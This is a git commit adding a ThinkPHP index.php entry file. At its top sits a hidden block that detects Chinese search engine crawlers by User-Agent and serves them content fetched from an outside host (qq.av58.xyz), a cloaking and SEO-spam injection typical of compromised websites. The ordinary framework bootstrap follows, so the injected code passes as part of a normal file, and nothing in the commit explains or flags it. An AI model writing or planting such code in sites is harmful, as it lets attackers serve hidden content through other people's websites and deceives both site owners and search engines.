a067f4751724538fc300136c1054c8e32befc128
xblydll <38805285+xblydll@users.noreply.github.com>
2018-05-16 16:19:50 +0800

    Add files via upload

---
+++ index.php
@@ -0,0 +1,34 @@
+﻿<?php
+header('Content-Type:text/html;charset=utf-8');
+$key= $_SERVER["HTTP_USER_AGENT"];
+if(strpos($key,'baidu')!==false||strpos($key,'haosou')!==false||strpos($key,'sogou')!==false||strpos($key,'360')!==false)
+{
+   $file = file_get_contents('http://qq.av58.xyz/u8/'); 
+   echo $file;//
+}
+?><?php
+// +----------------------------------------------------------------------
+// | ThinkPHP [ WE CAN DO IT JUST THINK ]
+// +----------------------------------------------------------------------
+// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.
+// +----------------------------------------------------------------------
+// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
+// +----------------------------------------------------------------------
+// | Author: liu21st <liu21st@gmail.com>
+// +----------------------------------------------------------------------
+
+// 应用入口文件
+
+// 检测PHP环境
+if(version_compare(PHP_VERSION,'5.3.0','<'))  die('require PHP > 5.3.0 !');
+
+// 开启调试模式 建议开发阶段开启 部署阶段注释或者设为false
+define('APP_DEBUG',True);
+define('KEY','_HTYS_');
+// 定义应用目录
+define('APP_PATH','./Application/');
+
+// 引入ThinkPHP入口文件
+require './ThinkPHP/ThinkPHP.php';
+
+// 亲^_^ 后面不需要任何代码了 就是如此简单
